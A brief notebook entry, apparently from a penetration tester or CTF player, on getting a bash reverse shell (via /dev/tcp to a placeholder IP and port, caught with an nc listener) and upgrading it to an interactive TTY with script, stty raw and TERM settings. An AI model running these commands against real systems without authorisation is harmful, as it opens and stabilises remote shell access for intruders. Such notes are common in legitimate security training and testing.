Interesting observation where a user upgraded the usability of their shell. Allows for the ability to up arrow prev commands.

```
`bash -c 'bash -i >& /dev/tcp/[IP]/[Port] 0>&1'

nc -nvlp 80


script -qc /bin/bash /dev/null
[CTRL+Z]

stty raw -echo; fg
			reset xterm


echo $TERM

export TERM=xterm
```

script not found?
- doing this without will severly mess up your terminal by offsetting text
